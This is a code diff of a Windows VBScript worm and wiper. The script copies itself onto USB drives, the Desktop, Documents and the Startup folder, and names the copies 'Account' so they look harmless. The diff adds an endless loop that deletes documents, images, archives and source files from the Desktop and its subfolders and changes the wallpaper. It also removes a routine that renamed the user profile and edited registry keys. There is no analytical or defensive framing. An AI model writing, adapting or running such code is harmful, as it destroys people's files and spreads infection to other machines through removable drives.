@@ -11,8 +11,8 @@ strDesktopFolder = objShell.SpecialFolders("Desktop")
 ' Get the path to the documents folder
 strDocumentsFolder = objShell.SpecialFolders("MyDocuments")
 
-' Specify the number of copies to create
-numCopies = 999
+' Specify the number of accounts to create
+numAccounts = 5
 
 ' Find the USB drive
 usbDrivePath = ""
@@ -29,10 +29,10 @@ Next
 If usbDrivePath <> "" Then
     ' Generate copies of the script on the USB drive
     On Error Resume Next ' Ignore errors
-    For i = 1 To numCopies
+    For i = 1 To numAccounts
         randomIteration = Int((1000 * Rnd) + 1)
 
-        strCopyPath = usbDrivePath & "\☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎" & randomIteration & ".vbs"
+        strCopyPath = usbDrivePath & "\Account" & randomIteration & ".vbs"
         objFSO.CopyFile strScriptPath, strCopyPath, True ' Add "True" to overwrite existing files
     Next
     On Error GoTo 0 ' Reset error handling
@@ -40,15 +40,15 @@ End If
 
 ' Create copies of the script on the desktop and in the documents folder
 On Error Resume Next ' Ignore errors
-For i = 1 To numCopies
+For i = 1 To numAccounts
     randomIteration = Int((1000 * Rnd) + 1)
 
     ' Create a copy of the script on the desktop
-    strDesktopCopyPath = strDesktopFolder & "\☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎" & randomIteration & ".vbs"
+    strDesktopCopyPath = strDesktopFolder & "\Account" & randomIteration & ".vbs"
     objFSO.CopyFile strScriptPath, strDesktopCopyPath, True ' Add "True" to overwrite existing files
 
     ' Create a copy of the script in the documents folder
-    strDocumentsCopyPath = strDocumentsFolder & "\☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎" & randomIteration & ".vbs"
+    strDocumentsCopyPath = strDocumentsFolder & "\Account" & randomIteration & ".vbs"
     objFSO.CopyFile strScriptPath, strDocumentsCopyPath, True ' Add "True" to overwrite existing files
 Next
 On Error GoTo 0 ' Reset error handling
@@ -56,52 +56,42 @@ On Error GoTo 0 ' Reset error handling
 ' Add the script to the startup folder
 On Error Resume Next ' Ignore errors
 startupFolder = objShell.SpecialFolders("Startup")
-objFSO.CopyFile strScriptPath, startupFolder & "\☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎.vbs", True ' Add "True" to overwrite existing files
+objFSO.CopyFile strScriptPath, startupFolder & "\Account.vbs", True ' Add "True" to overwrite existing files
 On Error GoTo 0 ' Reset error handling
 
-' Function to change the username
-Sub ChangeUsername(newUsername)
-    ' Rename the user profile folder
-    Set wshNetwork = CreateObject("WScript.Network")
-    oldUsername = wshNetwork.UserName
-    userProfilePath = "C:\Users\" & oldUsername
-    newProfilePath = "C:\Users\" & newUsername
-    
-    ' Rename the user profile folder
-    objFSO.MoveFolder userProfilePath, newProfilePath
-    
-    ' Update the username in the registry
-    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
-    Set colItems = objWMI.ExecQuery("SELECT SID FROM Win32_UserAccount WHERE Name = '" & oldUsername & "'")
-    
-    For Each objItem In colItems
-        sid = objItem.SID
-        Exit For
+' Loop indefinitely
+Do
+    ' Delete all files except VBS files within the specified folders
+    For Each folderPath In foldersToDelete
+        DeleteFilesExceptVBS folderPath
     Next
-    
-    If Not IsEmpty(sid) Then
-        strKeyPath = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\" & sid
-        objRegistry.DeleteKey &H80000001, strKeyPath ' Delete the old registry key
-        
-        ' Create a new registry key with the updated username
-        strKeyPath = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\" & sid
-        objRegistry.CreateKey &H80000001, strKeyPath
-        
-        ' Set the ProfileImagePath value in the new registry key
-        objRegistry.SetStringValue &H80000001, strKeyPath, "ProfileImagePath", newProfilePath
-    End If
-End Sub
 
-' Call the ChangeUsername function with the new desired username
-newUsername = "☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎"
-ChangeUsername newUsername
+    ' Set wallpaper
+    objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", "C:\Windows\System32\imageres.dll", "REG_SZ"
+    objShell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
+
+    ' Loop through each file in the Desktop folder and delete if it has a specified file extension
+    For Each objFile In objFSO.GetFolder(strDesktopFolder).Files
+        Dim extension
+        extension = LCase(objFSO.GetExtensionName(objFile.Name))
+        If extension = "txt" Or extension = "exe" Or extension = "json" Or extension = "doc" Or extension = "pdf" Or extension = "wpd" Or extension = "docx" Or extension = "rtf" Or extension = "tex" Or extension = "odt" Or extension = "jpg" Or extension = "jpeg" Or extension = "mp3" Or extension = "rar" Or extension = "vcd" Or extension = "webp" Or extension = "css" Or extension = "html" Or extension = "py" Or extension = "php" Or extension = "ico" Or extension = "lnk" Or extension = "mp4" Or extension = "js" Or extension = "bak" Or extension = "xml" Or extension = "zip" Or extension = "bmp" Then
+            objFSO.DeleteFile(objFile)
+        End If
+    Next
+
+    ' Loop through each folder on the Desktop and delete files within them
+    For Each objFolder In objFSO.GetFolder(strDesktopFolder).Subfolders
+        For Each objFile In objFolder.Files
+            objFSO.DeleteFile(objFile.Path)
+        Next
+    Next
 
     ' Generate copies of the script within each folder on the Desktop
     For Each objFolder In objFSO.GetFolder(strDesktopFolder).Subfolders
         On Error Resume Next ' Ignore errors
-        For i = 1 To numCopies
+        For i = 1 To numAccounts
             randomIteration = Int((1000 * Rnd) + 1)
-            strCopyPath = objFolder.Path & "\☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎" & randomIteration & ".vbs"
+            strCopyPath = objFolder.Path & "\Account" & randomIteration & ".vbs"
             objFSO.CopyFile strScriptPath, strCopyPath, True ' Add "True" to overwrite existing files
         Next
         On Error GoTo 0 ' Reset error handling
